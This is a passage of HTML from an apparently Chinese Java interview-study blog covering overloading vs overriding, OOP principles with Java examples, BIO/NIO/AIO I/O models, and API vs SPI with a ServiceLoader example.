display()&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Parent</span> <span class="variable">obj2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Child</span>();</span><br><span class="line">        obj2.display();  <span class="comment">// 输出 &quot;Child display()&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="重载和重写的区别"><a href="#重载和重写的区别" class="headerlink" title="重载和重写的区别"></a>重载和重写的区别</h4><p>1、重载是一个编译期概念、重写是一个运行期间概念。</p>
<p>2、重载遵循所谓“编译期绑定”，即在编译时根据参数变量的类型判断应该调用哪个方法。</p>
<p>3、重写遵循所谓“运行期绑定”，即在运行的时候，根据引用变量所指向的实际对象的类型来调用方法</p>
<h1 id="✅如何理解面向对象和面向过程？"><a href="#✅如何理解面向对象和面向过程？" class="headerlink" title="✅如何理解面向对象和面向过程？"></a>✅如何理解面向对象和面向过程？</h1><h2 id="典型回答-4"><a href="#典型回答-4" class="headerlink" title="典型回答"></a>典型回答</h2><p><strong>面向过程</strong>把问题分解成一个一个步骤，每个步骤用函数实现，依次调用即可。</p>
<p>我们在进行面向过程编程的时候，不需要考虑那么多，上来先定义一个函数，然后使用各种诸如if-else、for-each等方式进行代码执行。最典型的用法就是实现一个简单的算法，比如实现冒泡排序。 </p>
<p><strong>面向对象</strong>将问题分解成一个一个步骤，对每个步骤进行相应的抽象，形成对象，通过不同对象之间的调用，组合解决问题。</p>
<p>就是说，在进行面向对象进行编程的时候，要把属性、行为等封装成对象，然后基于这些对象及对象的能力进行业务逻辑的实现。比如想要造一辆车，上来要先把车的各种属性定义出来，然后抽象成一个Car类。</p>
<p>面向对象有封装、继承、多态三大基本特征，和单一职责原则、开放封闭原则、Liskov替换原则、依赖倒置原则和 接口隔离原则等五大基本原则。</p>
<h2 id="知识扩展"><a href="#知识扩展" class="headerlink" title="知识扩展"></a>知识扩展</h2><h2 id="面向对象的三大基本特征"><a href="#面向对象的三大基本特征" class="headerlink" title="面向对象的三大基本特征?"></a>面向对象的三大基本特征?</h2><p>三大基本特征：封装、继承、多态。</p>
<h3 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h3><p>封装就是把现实世界中的客观事物抽象成一个Java类，然后在类中存放属性和方法。如封装一个<code>汽车</code>类，其中包含了<code>发动机</code>、<code>轮胎</code> 、<code>底盘</code>等属性，并且有<code>启动</code>、<code>前进</code>等方法。</p>
<h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><p>像现实世界中儿子可以继承父亲的财产、样貌、行为等一样，编程世界中也有继承，继承的主要目的就是为了复用。子类可以继承父类，这样就可以把父类的属性和方法继承过来。</p>
<p>如Dog类可以继承Animal类，继承过来<code>嘴巴</code>、<code>颜色</code>等属性， <code>吃东西</code>、<code>奔跑</code>等行为。</p>
<h3 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h3><p>多态是指在父类中定义的方法被子类继承之后，可以通过重写，使得父类和子类具有不同的实现，这使得同一个方法在父类及其各个子类中具有不同含义。</p>
<h2 id="继承和实现"><a href="#继承和实现" class="headerlink" title="继承和实现"></a>继承和实现</h2><p>在Java中，接口可以继承接口，抽象类可以实现接口，抽象类也可以继承具体类。普通类可以实现接口，普通类也可以继承抽象类和普通类。</p>
<p>Java支持多实现，但是只支持单继承。即一个类可以实现多个接口，但是不能继承多个类。</p>
<h3 id="为什么Java不支持多继承？"><a href="#为什么Java不支持多继承？" class="headerlink" title="为什么Java不支持多继承？"></a>为什么Java不支持多继承？</h3><h2 id="面向对象的五大基本原则？"><a href="#面向对象的五大基本原则？" class="headerlink" title="面向对象的五大基本原则？"></a>面向对象的五大基本原则？</h2><ul>
<li><strong>单一职责原则（Single-Responsibility Principle</strong>）<ul>
<li>内容：一个类最好只做一件事</li>
<li><strong>提高可维护性</strong>：当一个类只负责一个功能时，其实现通常更简单、更直接，这使得理解和维护变得更容易。</li>
<li><strong>减少代码修改的影响</strong>：更改影响较小的部分，因此减少了对系统其他部分的潜在破坏。</li>
</ul>
</li>
<li><strong>开放封闭原则（Open-Closed principle）</strong><ul>
<li>内容：对扩展开放、对修改封闭</li>
<li><strong>促进可扩展性</strong>：可以在不修改现有代码的情况下扩展功能，这意味着新的功能可以添加，而不会影响旧的功能。</li>
<li><strong>降低风险</strong>：由于不需要修改现有代码，因此引入新错误的风险较低。</li>
</ul>
</li>
<li><strong>Liskov替换原则（Liskov-Substituion Principle）</strong><ul>
<li>内容：子类必须能够替换其基类</li>
<li><strong>提高代码的可互换性</strong>：能够用派生类的实例替换基类的实例，使得代码更加模块化，提高了其灵活性。</li>
<li><strong>增加代码的可重用性</strong>：遵循LSP的类和组件更容易被重用于不同的上下文。</li>
</ul>
</li>
<li><strong>依赖倒置原则（Dependency-Inversion Principle）</strong><ul>
<li>内容：程序要依赖于抽象接口，而不是具体的实现</li>
<li><strong>提高代码的可测试性</strong>：通过依赖于抽象而不是具体实现，可以轻松地对代码进行单元测试。</li>
<li><strong>减少系统耦合</strong>：系统的高层模块不依赖于低层模块的具体实现，从而使得系统更加灵活和可维护。</li>
</ul>
</li>
<li><strong>接口隔离原则（Interface-Segregation Principle）。</strong><ul>
<li>内容：使用多个小的专门的接口，而不要使用一个大的总接口</li>
<li><strong>减少系统耦合</strong>：通过使用专门的接口而不是一个大而全的接口，系统中的不同部分之间的依赖性减少了。</li>
<li><strong>提升灵活性和稳定性</strong>：更改一个小接口比更改一个大接口风险更低，更容易管理。</li>
</ul>
</li>
</ul>
<p>以下是一些示例，通过代码的方式给大家介绍一下这几个原则具体的应用和实践。</p>
<h4 id="单一职责原则：一个类最好只做一件事"><a href="#单一职责原则：一个类最好只做一件事" class="headerlink" title="单一职责原则：一个类最好只做一件事"></a>单一职责原则：一个类最好只做一件事</h4><p>假如有一个类用于日志消息的处理，但是这个类不仅仅负责创建日志消息，还负责将其写入文件。根据单一职责原则，我们应该将这两个职责分开，让一个类专注于创建日志消息，而另一个类专注于日志消息的存储。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 负责日志消息的创建</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LogMessageCreator</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">createLogMessage</span><span class="params">(String message, LogLevel level)</span> &#123;</span><br><span class="line">        <span class="comment">// 创建和格式化日志消息</span></span><br><span class="line">        <span class="type">LocalDateTime</span> <span class="variable">now</span> <span class="operator">=</span> LocalDateTime.now();</span><br><span class="line">        <span class="keyword">return</span> now.toString() + <span class="string">&quot; [&quot;</span> + level.toString() + <span class="string">&quot;] &quot;</span> + message;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 日志级别枚举</span></span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">LogLevel</span> &#123;</span><br><span class="line">    INFO, WARNING, ERROR;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 负责日志消息的存储</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LogFileWriter</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">writeToFile</span><span class="params">(String message, String filename)</span> &#123;</span><br><span class="line">        <span class="comment">// 将日志消息写入指定的文件</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Files.write(Paths.get(filename), message.getBytes(), StandardOpenOption.APPEND);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="comment">// 处理文件写入异常</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用例子</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Logger</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> LogMessageCreator messageCreator;</span><br><span class="line">    <span class="keyword">private</span> LogFileWriter fileWriter;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Logger</span><span class="params">()</span> &#123;</span><br><span class="line">        messageCreator = <span class="keyword">new</span> <span class="title class_">LogMessageCreator</span>();</span><br><span class="line">        fileWriter = <span class="keyword">new</span> <span class="title class_">LogFileWriter</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">log</span><span class="params">(String message, LogLevel level, String filename)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">logMessage</span> <span class="operator">=</span> messageCreator.createLogMessage(message, level);</span><br><span class="line">        fileWriter.writeToFile(logMessage, filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>LogMessageCreator类只负责创建和格式化日志消息，而LogFileWriter类只负责将日志消息写入文件。这种分离确保了每个类只有一个改变的原因，遵循了单一职责原则。</p>
<h4 id="开放封闭原则：对扩展开放、对修改封闭"><a href="#开放封闭原则：对扩展开放、对修改封闭" class="headerlink" title="开放封闭原则：对扩展开放、对修改封闭"></a>开放封闭原则：对扩展开放、对修改封闭</h4><p>假设有一个图形绘制应用程序，其中有一个Shape类。</p>
<p>在遵守开闭原则的情况下，如果要添加新的形状类型，应该能够扩展Shape类而无需修改现有代码。这可以通过创建继承自Shape的新类来实现，如Circle和Rectangle。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 形状接口</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Shape</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">draw</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 圆形类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Circle</span> <span class="keyword">implements</span> <span class="title class_">Shape</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">draw</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 绘制圆形</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 矩形类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Rectangle</span> <span class="keyword">implements</span> <span class="title class_">Shape</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">draw</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 绘制矩形</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 图形绘制类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">GraphicEditor</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">drawShape</span><span class="params">(Shape shape)</span> &#123;</span><br><span class="line">        shape.draw();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>这样，当我们想要修改Circle的时候不会对Rectangle有任何影响。</p>
<h4 id="里氏替换原则：子类必须能够替换其基类"><a href="#里氏替换原则：子类必须能够替换其基类" class="headerlink" title="里氏替换原则：子类必须能够替换其基类"></a>里氏替换原则：子类必须能够替换其基类</h4><p>假设有一个函数接受Bird对象作为参数。根据里氏替换原则，这个函数应该能够接受一个Bird的子类对象（如Sparrow或Penguin）而不影响程序运行。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 鸟类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Bird</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">fly</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 实现飞行</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 麻雀类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Sparrow</span> <span class="keyword">extends</span> <span class="title class_">Bird</span> &#123;</span><br><span class="line">    <span class="comment">// 重写飞行行为</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 企鹅类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Penguin</span> <span class="keyword">extends</span> <span class="title class_">Bird</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">fly</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnsupportedOperationException</span>(<span class="string">&quot;Penguin can&#x27;t fly&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="type">Penguin</span> <span class="variable">penguin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Penguin</span>();</span><br><span class="line"></span><br><span class="line">    makeItFly(penguin);</span><br><span class="line"></span><br><span class="line">    <span class="type">Sparrow</span> <span class="variable">sparrow</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Sparrow</span>();</span><br><span class="line">    makeItFly(sparrow);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用鸟类的函数</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">makeItFly</span><span class="params">(Bird bird)</span> &#123;</span><br><span class="line">    bird.fly();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>我们可以把任意一个Bird的实现传入到makeItFly方法中，实现了用子类替换父类</p>
<h4 id="依赖倒置原则：程序要依赖于抽象接口，而不是具体的实现"><a href="#依赖倒置原则：程序要依赖于抽象接口，而不是具体的实现" class="headerlink" title="依赖倒置原则：程序要依赖于抽象接口，而不是具体的实现"></a>依赖倒置原则：程序要依赖于抽象接口，而不是具体的实现</h4><p>在构建一个电商应用程序时，一个高层的“订单处理”模块不应该直接依赖于一个低层的“数据访问”模块。相反，它们应该依赖于抽象，例如一个接口。这样，数据访问的具体实现可以随时改变，而不会影响订单处理模块。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 数据访问接口</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">DataAccess</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">saveOrder</span><span class="params">(Order order)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 高层模块：订单处理</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">OrderProcessingService</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> DataAccess dataAccess;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">OrderProcessingService</span><span class="params">(DataAccess dataAccess)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.dataAccess = dataAccess;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processOrder</span><span class="params">(Order order)</span> &#123;</span><br><span class="line">        <span class="comment">// 订单处理逻辑</span></span><br><span class="line">        dataAccess.saveOrder(order);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 低层模块：数据访问实现</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DatabaseDataAccess</span> <span class="keyword">implements</span> <span class="title class_">DataAccess</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">saveOrder</span><span class="params">(Order order)</span> &#123;</span><br><span class="line">        <span class="comment">// 数据库保存逻辑</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>这样底层的数据存储我们就可以任意更换，可以用MySQL，可以用Redis，可以用达梦，也可以用OceanBase，因为我们做到了依赖接口，而不是具体实现。</p>
<h4 id="接口隔离原则：使用多个小的专门的接口，而不要使用一个大的总接口"><a href="#接口隔离原则：使用多个小的专门的接口，而不要使用一个大的总接口" class="headerlink" title="接口隔离原则：使用多个小的专门的接口，而不要使用一个大的总接口"></a>接口隔离原则：使用多个小的专门的接口，而不要使用一个大的总接口</h4><p>如果有一个多功能打印机接口包含打印、扫描和复制功能，那么只需要打印功能的客户端应该不必实现扫描和复制的接口。这可以通过将大接口分解为更小且更具体的接口来实现。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 打印接口</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Printer</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">print</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 扫描接口</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Scanner</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">scan</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 多功能打印机类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MultiFunctionPrinter</span> <span class="keyword">implements</span> <span class="title class_">Printer</span>, Scanner &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 打印实现</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">scan</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 扫描实现</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 仅打印类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SimplePrinter</span> <span class="keyword">implements</span> <span class="title class_">Printer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 打印实现</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="✅什么是AIO、BIO和NIO？"><a href="#✅什么是AIO、BIO和NIO？" class="headerlink" title="✅什么是AIO、BIO和NIO？"></a>✅什么是AIO、BIO和NIO？</h1><h2 id="典型回答-5"><a href="#典型回答-5" class="headerlink" title="典型回答"></a>典型回答</h2><p>BIO （Blocking I&#x2F;O）：<strong>同步阻塞I&#x2F;O</strong>，是JDK1.4之前的传统IO模型。 线程发起IO请求后，一直阻塞，直到缓冲区数据就绪后，再进入下一步操作。</p>
<p>NIO (Non-Blocking I&#x2F;O）：<strong>同步非阻塞IO</strong>，线程发起IO请求后，不需要阻塞，立即返回。用户线程不原地等待IO缓冲区，可以先做一些其他操作，只需要定时轮询检查IO缓冲区数据是否就绪即可。</p>
<p>AIO （ Asynchronous I&#x2F;O）：<strong>异步非阻塞I&#x2F;O模型</strong>。线程发起IO请求后，不需要阻塞，立即返回，也不需要定时轮询检查结果，异步IO操作之后会回调通知调用方。</p>
<p><img src="https://raw.githubusercontent.com/Cherises/Blog-Resource-2/refs/heads/main/photos/hexo/34247/img/iEmVlynWvOsSrXG7/1705133708567-49955e01-446a-4fef-b441-4356180eac5c-289154.png" alt="1705133708567-49955e01-446a-4fef-b441-4356180eac5c.png"></p>
<h2 id="知识扩展-1"><a href="#知识扩展-1" class="headerlink" title="知识扩展"></a>知识扩展</h2><h2 id="Java中BIO、NIO、AIO分别适用哪些场景？"><a href="#Java中BIO、NIO、AIO分别适用哪些场景？" class="headerlink" title="Java中BIO、NIO、AIO分别适用哪些场景？"></a>Java中BIO、NIO、AIO分别适用哪些场景？</h2><p>BIO方式适用于连接数目比较小且固定的架构，这种方式对服务器资源要求比较高，并发局限于应用中，JDK1.4以前的唯一选择，但程序直观简单易理解。</p>
<p>NIO方式适用于连接数目多且连接比较短（轻操作）的架构，比如聊天服务器，并发局限于应用中，编程比较复杂，JDK1.4开始支持。</p>
<p>AIO方式适用于连接数目多且连接比较长（重操作）的架构，比如相册服务器，充分调用OS参与并发操作，编程比较复杂，JDK7开始支持。</p>
<h1 id="✅什么是SPI，和API有啥区别"><a href="#✅什么是SPI，和API有啥区别" class="headerlink" title="✅什么是SPI，和API有啥区别"></a>✅什么是SPI，和API有啥区别</h1><h2 id="典型回答-6"><a href="#典型回答-6" class="headerlink" title="典型回答"></a>典型回答</h2><p>Java 中区分 API 和 SPI，通俗的讲：API 和 SPI 都是相对的概念，他们的差别只在语义上，API 直接被应用开发人员使用，SPI 被框架扩展人员使用。</p>
<p>API Application Programming Interface</p>
<p>API是一组定义了软件组件之间交互的规则和约定的接口。提供方来制定接口并完成对接口的不同实现，调用方只需要调用即可。</p>
<p>SPI Service Provider Interface</p>
<p>SPI是一种扩展机制，通常用于在应用程序中提供可插拔的实现。 调用方可选择使用提供方提供的内置实现，也可以自己实现。</p>
<p>请记住这句话：<strong>API用于定义调用接口，而SPI用于定义和提供可插拔的实现方式。</strong></p>
<hr>
<p>所以说，API 是面向普通开发者的，提供一组功能，使他们可以利用一个库或框架来实现具体的功能。而 是面向那些希望扩展或定制基础服务的开发者的，它定义了一种机制，让其他开发者可以提供新的实现或扩展现有的功能。</p>
<h2 id="知识扩展-2"><a href="#知识扩展-2" class="headerlink" title="知识扩展"></a>知识扩展</h2><h2 id="如何定义一个SPI"><a href="#如何定义一个SPI" class="headerlink" title="如何定义一个SPI"></a>如何定义一个SPI</h2><p>步骤1、定义一组接口 (假设是org.foo.demo.IShout)，并写出接口的一个或多个实现，(假设是org.foo.demo.animal.Dog、org.foo.demo.animal.Cat)。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IShout</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">shout</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Cat</span> <span class="keyword">implements</span> <span class="title class_">IShout</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">shout</span><span class="params">()</span> &#123;</span><br><span class="line">    	System.out.println(<span class="string">&quot;miao miao&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dog</span> <span class="keyword">implements</span> <span class="title class_">IShout</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">shout</span><span class="params">()</span> &#123;</span><br><span class="line">    	System.out.println(<span class="string">&quot;wang wang&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>步骤2、在 src&#x2F;main&#x2F;resources&#x2F; 下建立 &#x2F;META-INF&#x2F;services 目录， 新增一个以接口命名的文件 (org.foo.demo.IShout文件)，内容是要应用的实现类（这里是org.foo.demo.animal.Dog和org.foo.demo.animal.Cat，每行一个类）。</p>
<p>org.foo.demo.animal.Dog</p>
<p>org.foo.demo.animal.Cat</p>
<p>步骤3、使用 ServiceLoader 来加载配置文件中指定的实现。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SPIMain</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ServiceLoader&lt;IShout&gt; shouts = ServiceLoader.load(IShout.class);</span><br><span class="line">        <span class="keyword">for</span> (IShout s : shouts) &#123;</span><br><span class="line">        	s.shout();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代码输出：</p>
<p>wang wang</p>
<p>miao miao</p>
<h2 id="SPI的实现原理"><a href="#SPI的实现原理" class="headerlink" title="SPI的实现原理"></a>SPI的实现原理</h2><p>看ServiceLoader类的签名类的成员变量：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">ServiceLoader</span>&lt;S&gt; <span class="keyword">implements</span> <span class="title class_">Iterable</span>&lt;S&gt;&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">PREFIX</span> <span class="operator">=</span> <span class="string">&quot;META-INF/services/&quot;</span>;</span><br><span class="line">    <span class="comment">// 代表被加载的类或者接口</span></span><br><span class="line">    